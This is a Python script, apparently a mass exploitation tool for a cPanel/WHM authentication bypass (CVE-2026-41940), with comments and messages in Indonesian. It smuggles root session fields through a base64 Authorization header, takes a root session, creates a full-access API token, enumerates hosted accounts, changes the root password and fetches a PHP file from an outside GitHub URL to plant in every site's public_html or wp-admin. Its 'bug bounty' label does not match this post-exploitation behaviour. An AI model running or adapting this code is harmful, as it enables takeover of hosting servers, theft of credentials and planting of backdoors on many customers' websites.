import argparse
import json
import re
import sys
import time
import threading
import urllib.parse
import urllib.request
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── warna ANSI ────────────────────────────────────────────────────────────────
G  = "\033[92m"
Y  = "\033[93m"
R  = "\033[91m"
B  = "\033[94m"
W  = "\033[97m"
RST = "\033[0m"
BLD = "\033[1m"

banner = f"""{B}{BLD}
  ╔══════════════════════════════════════════════════════╗
  ║   CVE-2026-41940 - cPanel/WHM Authentication Bypass  ║
  ║   Bug Bounty Scanner | threading + color edition      ║
  ╚══════════════════════════════════════════════════════╝
{RST}"""

print(banner)

PAYLOAD_CRLF = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)
PAYLOAD_LF = (
    "cm9vdDp4CnN1Y2Nlc3NmdWxfaW50ZXJuYWxfYXV0aF93aXRoX3RpbWVzdGFtcD05OTk5"
    "OTk5OTk5CnVzZXI9cm9vdAp0ZmFfdmVyaWZpZWQ9MQpoYXNyb290PTE="
)
PAYLOADS = [("CRLF", PAYLOAD_CRLF), ("LF", PAYLOAD_LF)]

DEPLOY_URL      = "https://raw.githubusercontent.com/archdebian/xs/refs/heads/main/functionx.php"
DEPLOY_CONTENT  = None
DEPLOY_FILENAME = DEPLOY_URL.split("/")[-1]

print_lock  = threading.Lock()
file_lock   = threading.Lock()
counts_lock = threading.Lock()

counts = {
    "VULNERABLE":     0,
    "patched":        0,
    "not_vulnerable": 0,
    "unreachable":    0,
    "timeout":        0,
    "error":          0,
}


class ExploitError(Exception):
    pass


def cprint(msg, color=W):
    with print_lock:
        print(f"{color}{msg}{RST}", flush=True)


def normalize_target(raw):
    raw = raw.strip()
    if not raw:
        return None
    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw
    u = urllib.parse.urlsplit(raw)
    host   = u.hostname
    port   = u.port or 2087
    scheme = u.scheme or "https"
    if not host:
        return None
    return scheme, host, port


def discover_canonical_host(scheme, host, port, timeout):
    try:
        r = requests.get(
            f"{scheme}://{host}:{port}/openid_connect/cpanelid",
            verify=False, allow_redirects=False,
            headers={"Connection": "close"}, timeout=timeout,
        )
    except Exception as e:
        raise ExploitError(f"tidak bisa terhubung: {e}")
    loc = r.headers.get("Location", "")
    m = re.match(r"^(https?)://([^:/]+)(?::(\d+))?", loc)
    if m:
        return m.group(1), m.group(2), int(m.group(3)) if m.group(3) else port, m.group(2)
    return scheme, host, port, host


def make_session():
    s = requests.Session()
    s.verify = False
    return s


def http(s, method, scheme, host, port, canonical, path, req_timeout, **kw):
    headers = kw.pop("headers", {})
    headers.setdefault("Host", f"{canonical}:{port}")
    headers.setdefault("Connection", "close")
    return s.request(method, f"{scheme}://{host}:{port}{path}",
                     headers=headers, allow_redirects=False, timeout=req_timeout, **kw)


def stage1_preauth(s, scheme, host, port, canonical, req_timeout):
    r = http(s, "POST", scheme, host, port, canonical,
             "/login/?login_only=1", req_timeout,
             data={"user": "root", "pass": "wrong"})
    cookie_value = None
    for k, v in r.raw.headers.items():
        if k.lower() == "set-cookie" and v.startswith("whostmgrsession="):
            cookie_value = v.split("=", 1)[1].split(";", 1)[0]
            cookie_value = urllib.parse.unquote(cookie_value)
            break
    if not cookie_value:
        raise ExploitError("tidak ada whostmgrsession cookie — mungkin bukan cPanel")
    return cookie_value.split(",", 1)[0] if "," in cookie_value else cookie_value


def stage2_inject(s, scheme, host, port, canonical, session_base, req_timeout, payload_b64):
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical, "/", req_timeout,
             headers={"Authorization": f"Basic {payload_b64}",
                      "Cookie": f"whostmgrsession={cookie_enc}"})
    loc = r.headers.get("Location", "")
    m = re.search(r"/cpsess\d{10}", loc)
    if not m:
        raise ExploitError(f"tidak ada /cpsess token (HTTP {r.status_code})")
    return m.group(0)


def stage3_propagate(s, scheme, host, port, canonical, session_base, req_timeout):
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical, "/scripts2/listaccts", req_timeout,
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})
    body = r.text or ""
    if not (r.status_code == 401 and ("Token denied" in body or "WHM Login" in body)):
        raise ExploitError(f"do_token_denied tidak berjalan (HTTP {r.status_code})")


def stage4_verify(s, scheme, host, port, canonical, session_base, token, req_timeout):
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical,
             f"{token}/json-api/version", req_timeout,
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})
    body = (r.text or "").strip()
    if r.status_code == 200 and '"version"' in body:
        return True, body[:200]
    if r.status_code in (500, 503) and "License" in body:
        return True, body[:200]
    return False, body[:200]


def call_whm_api(s, scheme, host, port, canonical, session_base, token,
                 function, params, req_timeout):
    cookie_enc = urllib.parse.quote(session_base)
    qs = "api.version=1"
    for k, v in params.items():
        if v is None:
            continue
        qs += f"&{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}"
    path = f"{token}/json-api/{function}?{qs}"
    r = http(s, "GET", scheme, host, port, canonical, path, req_timeout,
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})
    body = r.text or ""
    try:
        return r.status_code, json.loads(body)
    except Exception:
        return r.status_code, body


def do_passwd(s, scheme, host, port, canonical, session_base, token, password, req_timeout):
    return call_whm_api(s, scheme, host, port, canonical, session_base, token,
                        "passwd", {"user": "root", "password": password}, req_timeout)


def generate_api_token(s, scheme, host, port, canonical, session_base, token, req_timeout):
    token_name = f"svc_{int(time.time()) % 100000}"
    code, resp = call_whm_api(s, scheme, host, port, canonical, session_base, token,
                              "api_token_create",
                              {"token_name": token_name, "acl-1": "all"}, req_timeout)
    if isinstance(resp, dict):
        api_token = (resp.get("data") or {}).get("token")
        if api_token:
            return token_name, api_token
    return None, None


def generate_login_url(scheme, host, port, api_token, req_timeout):
    try:
        r = requests.get(
            f"{scheme}://{host}:{port}/json-api/create_user_session"
            "?api.version=1&user=root&service=whostmgrd",
            headers={"Authorization": f"whm root:{api_token}", "Connection": "close"},
            verify=False, allow_redirects=False, timeout=req_timeout,
        )
        data = r.json().get("data") or {}
        return data.get("url")
    except Exception:
        return None


def enum_accounts(scheme, host, port, api_token, req_timeout):
    try:
        r = requests.get(
            f"{scheme}://{host}:{port}/json-api/listaccts?api.version=1",
            headers={"Authorization": f"whm root:{api_token}", "Connection": "close"},
            verify=False, allow_redirects=False, timeout=req_timeout,
        )
        data = r.json().get("data") or {}
        accts = data.get("acct") or []
        return [(a.get("user", "?"), a.get("domain", "?")) for a in accts]
    except Exception:
        return None


def deploy_to_wp(scheme, host, port, api_token, accounts, filename, content, req_timeout):
    deployed = []
    hdr = {"Authorization": f"whm root:{api_token}", "Connection": "close"}
    for user, domain in accounts:
        for subdir in ["public_html/wp-admin", "public_html"]:
            directory = f"/home/{user}/{subdir}"
            try:
                r = requests.post(
                    f"{scheme}://{host}:{port}/json-api/cpanel"
                    f"?cpanel_jsonapi_user={user}"
                    f"&cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile",
                    headers=hdr,
                    data={"cpanel_jsonapi_apiversion": "2",
                          "dir": directory, "filename": filename, "content": content},
                    verify=False, timeout=req_timeout,
                )
                err = (r.json().get("cpanelresult") or {}).get("error") or ""
                if not err:
                    url = f"https://{domain}/{'wp-admin/' if 'wp-admin' in subdir else ''}{filename}"
                    deployed.append((user, domain, url))
                    break
            except Exception:
                break
    return deployed


def exploit_target(raw_target, password, check_only, req_timeout, idx, total,
                   vuln_file, patched_file, enum_file, deploy_file):
    result = {"target": raw_target, "status": "error", "detail": ""}
    label  = f"[{idx}/{total}] {raw_target}"

    parsed = normalize_target(raw_target)
    if parsed is None:
        result["detail"] = "target tidak valid"
        _finalize(result, label, vuln_file, patched_file)
        return result

    scheme, host, port = parsed

    try:
        scheme, host, port, canonical = discover_canonical_host(scheme, host, port, req_timeout)
        cprint(f"{label} | [0] hostname={canonical} ({host}:{port})", Y)

        s = make_session()
        token        = None
        session_base = None
        used_method  = None

        for method_name, payload_b64 in PAYLOADS:
            try:
                cprint(f"{label} | [1] preauth... ({method_name})", Y)
                session_base = stage1_preauth(s, scheme, host, port, canonical, req_timeout)

                cprint(f"{label} | [2] inject... ({method_name})", Y)
                token = stage2_inject(s, scheme, host, port, canonical,
                                      session_base, req_timeout, payload_b64)
                used_method = method_name
                break
            except ExploitError:
                s = make_session()
                continue

        if token is None:
            raise ExploitError("semua payload gagal di stage 2 — kemungkinan sudah dipatch")

        cprint(f"{label} | [3] cache propagate...", Y)
        stage3_propagate(s, scheme, host, port, canonical, session_base, req_timeout)

        cprint(f"{label} | [4] verify root...", Y)
        ok, body = stage4_verify(s, scheme, host, port, canonical, session_base, token, req_timeout)

        if not ok:
            result["status"] = "patched"
            result["detail"] = body
        else:
            login_url   = f"{scheme}://{host}:{port}{token}/"
            cookie_hint = f"whostmgrsession={session_base}"
            result["status"]    = "VULNERABLE"
            result["detail"]    = f"[{used_method}] {body}"
            result["login_url"] = login_url
            result["cookie"]    = cookie_hint
            cprint(f"{label} | [+] *** VULNERABLE via {used_method} ***", G + BLD)
            cprint(f"{label} |     URL    : {login_url}", G + BLD)
            cprint(f"{label} |     Cookie : {cookie_hint}", G + BLD)

            cprint(f"{label} | [*] generate API token...", Y)
            tok_name, api_token = generate_api_token(s, scheme, host, port, canonical,
                                                     session_base, token, req_timeout)
            if api_token:
                result["api_token_name"] = tok_name
                result["api_token"]      = api_token
                cprint(f"{label} |     Token  : {api_token}", G + BLD)

                cprint(f"{label} | [*] generate login URL...", Y)
                login_token_url = generate_login_url(scheme, host, port, api_token, req_timeout)
                if login_token_url:
                    result["login_token_url"] = login_token_url
                    cprint(f"{label} |     Login  : {login_token_url}", G + BLD)
                else:
                    cprint(f"{label} |     Login  : gagal generate URL", R)

                cprint(f"{label} | [*] enum accounts...", Y)
                accounts = enum_accounts(scheme, host, port, api_token, req_timeout)
                if accounts is not None:
                    result["accounts"]      = accounts
                    result["account_count"] = len(accounts)
                    cprint(f"{label} |     Accounts: {len(accounts)} user → {enum_file}", G + BLD)
                    with file_lock:
                        with open(enum_file, "a") as f:
                            f.write(f"[{host}] — {len(accounts)} accounts\n")
                            for user, domain in accounts:
                                f.write(f"  {user} | {domain}\n")
                            f.write("\n")

                    if DEPLOY_CONTENT and accounts:
                        cprint(f"{label} | [*] deploy {DEPLOY_FILENAME}...", Y)
                        deployed = deploy_to_wp(scheme, host, port, api_token,
                                                accounts, DEPLOY_FILENAME,
                                                DEPLOY_CONTENT, req_timeout)
                        if deployed:
                            cprint(f"{label} |     Deployed: {len(deployed)} → {deploy_file}", G + BLD)
                            with file_lock:
                                with open(deploy_file, "a") as f:
                                    for _, _, url in deployed:
                                        f.write(url + "\n")
                        else:
                            cprint(f"{label} |     Deployed: gagal", R)
                else:
                    cprint(f"{label} |     Accounts: gagal enum", R)
            else:
                cprint(f"{label} |     Token  : gagal generate", R)

            if not check_only and password:
                cprint(f"{label} | [*] mengganti password root...", G + BLD)
                code, _ = do_passwd(s, scheme, host, port, canonical,
                                    session_base, token, password, req_timeout)
                result["passwd_change"] = f"HTTP {code}"
                cprint(f"{label} | [*] passwd -> HTTP {code}", G + BLD)

    except ExploitError as e:
        result["status"] = "not_vulnerable"
        result["detail"] = str(e)
    except requests.exceptions.ConnectionError as e:
        result["status"] = "unreachable"
        result["detail"] = str(e)[:120]
    except requests.exceptions.Timeout:
        result["status"] = "timeout"
        result["detail"] = "koneksi timeout"
    except Exception as e:
        result["status"] = "error"
        result["detail"] = str(e)[:120]

    _finalize(result, label, vuln_file, patched_file)
    return result


def _finalize(result, label, vuln_file, patched_file):
    status = result["status"]

    with counts_lock:
        counts[status] = counts.get(status, 0) + 1

    tag_map = {
        "VULNERABLE":     ("VULN   ", G + BLD),
        "patched":        ("PATCHED", Y),
        "not_vulnerable": ("SKIP   ", Y),
        "unreachable":    ("GAGAL  ", R),
        "timeout":        ("TIMEOUT", R),
        "error":          ("ERROR  ", R),
    }
    tag, color = tag_map.get(status, (status.upper(), W))
    detail = result.get("detail", "")[:80]
    cprint(f"{label} | [{tag}] {detail}", color)

    with file_lock:
        if status == "VULNERABLE" and vuln_file:
            with open(vuln_file, "a") as f:
                f.write(f"{result['target']}\n")
                if result.get("login_token_url"):
                    f.write(f"  Login URL : {result['login_token_url']}\n")
                else:
                    f.write(f"  URL       : {result.get('login_url', '-')}\n")
                    f.write(f"  Cookie    : {result.get('cookie', '-')}\n")
                if result.get("api_token"):
                    f.write(f"  API Token : {result['api_token']}\n")
                    f.write(f"  Token Name: {result['api_token_name']}\n")
                f.write("\n")

        if status == "patched" and patched_file:
            with open(patched_file, "a") as f:
                f.write(result["target"] + "\n")


def iter_targets(filepath):
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                yield line


def count_targets(filepath):
    with open(filepath, "r") as f:
        return sum(1 for l in f if l.strip() and not l.startswith("#"))


# ── argparse ──────────────────────────────────────────────────────────────────

parser = argparse.ArgumentParser(
    description="CVE-2026-41940 cPanel/WHM Auth Bypass — Bug Bounty Scanner"
)

target_group = parser.add_mutually_exclusive_group(required=True)
target_group.add_argument("--target", "-t",
                          help="Target tunggal")
target_group.add_argument("--file", "-f",
                          help="File berisi daftar target")

parser.add_argument("--password", "-p", default=None,
                    help="Password baru untuk root")
parser.add_argument("--check-only", "-c", action="store_true",
                    help="Hanya verifikasi bypass, tanpa ubah password")
parser.add_argument("--vuln-output", "-v", default="vuln.txt")
parser.add_argument("--patched-output", default="patched.txt")
parser.add_argument("--enum-output", "-e", default="acc_enum.txt")
parser.add_argument("--deploy-output", default="deployed.txt")
parser.add_argument("--workers", "-w", type=int, default=5)
parser.add_argument("--delay", "-d", type=float, default=0.5)
parser.add_argument("--timeout", type=int, default=15)

args = parser.parse_args()

if not args.check_only and args.password is None:
    print(f"{R}[!] Gunakan --password <pass> atau --check-only.{RST}")
    sys.exit(1)

# ── fetch deploy file ─────────────────────────────────────────────────────────

try:
    with urllib.request.urlopen(DEPLOY_URL, timeout=15) as _r:
        DEPLOY_CONTENT = _r.read().decode("utf-8", errors="replace")
    print(f"{G}[*] Deploy file    : {DEPLOY_FILENAME} ({len(DEPLOY_CONTENT)} bytes){RST}")
except Exception as e:
    print(f"{Y}[!] Deploy dilewati: {e}{RST}")

# ── kumpulkan targets ─────────────────────────────────────────────────────────

if args.target:
    targets_iter = iter([args.target])
    total = 1
else:
    try:
        total        = count_targets(args.file)
        targets_iter = iter_targets(args.file)
    except FileNotFoundError:
        print(f"{R}[!] File tidak ditemukan: {args.file}{RST}")
        sys.exit(1)

print(f"{B}[*] Total target    : {W}{total}{RST}")
print(f"{B}[*] Workers         : {W}{args.workers}{RST}")
print(f"{B}[*] Mode            : {W}{'check-only' if args.check_only else 'exploit'}{RST}")
print(f"{B}[*] Output vuln     : {G}{args.vuln_output}{RST}")
print(f"{B}[*] Output patched  : {Y}{args.patched_output}{RST}")
print(f"{B}[*] Output enum     : {W}{args.enum_output}{RST}")
print(f"{B}[*] Output deployed : {W}{args.deploy_output}{RST}")
print(f"{B}[*] Delay submit    : {W}{args.delay}s{RST}")
print(f"{B}" + "─" * 58 + RST)

for fpath in [args.vuln_output, args.patched_output, args.enum_output, args.deploy_output]:
    open(fpath, "a").close()

# ── thread pool scan ──────────────────────────────────────────────────────────

MAX_IN_FLIGHT = args.workers * 2
pending = set()

with ThreadPoolExecutor(max_workers=args.workers) as executor:
    for idx, target in enumerate(targets_iter, 1):
        while len(pending) >= MAX_IN_FLIGHT:
            done, pending = wait(pending, return_when=FIRST_COMPLETED)

        f = executor.submit(
            exploit_target, target, args.password, args.check_only,
            args.timeout, idx, total,
            args.vuln_output, args.patched_output, args.enum_output, args.deploy_output,
        )
        pending.add(f)

        if args.delay > 0:
            time.sleep(args.delay)

    for f in as_completed(pending):
        pass

# ── ringkasan ─────────────────────────────────────────────────────────────────

print(f"\n{BLD}" + "═" * 58 + RST)
print(f"{BLD}  RINGKASAN HASIL SCAN{RST}")
print(f"{BLD}" + "═" * 58 + RST)

summary_color = {
    "VULNERABLE": G, "patched": Y, "not_vulnerable": Y,
    "unreachable": R, "timeout": R, "error": R,
}
for status, count in counts.items():
    if count > 0:
        col = summary_color.get(status, W)
        print(f"  {col}{status:<20}{RST}: {BLD}{count}{RST}")

print(f"  {'─'*38}")
print(f"  {'Total':<20}: {BLD}{total}{RST}")
print(f"\n{G}[*] VULNERABLE  → {args.vuln_output}{RST}")
print(f"{Y}[*] Patched     → {args.patched_output}{RST}")
print(f"{W}[*] Enum        → {args.enum_output}{RST}")
print(f"{G}[*] Deployed    → {args.deploy_output}{RST}")
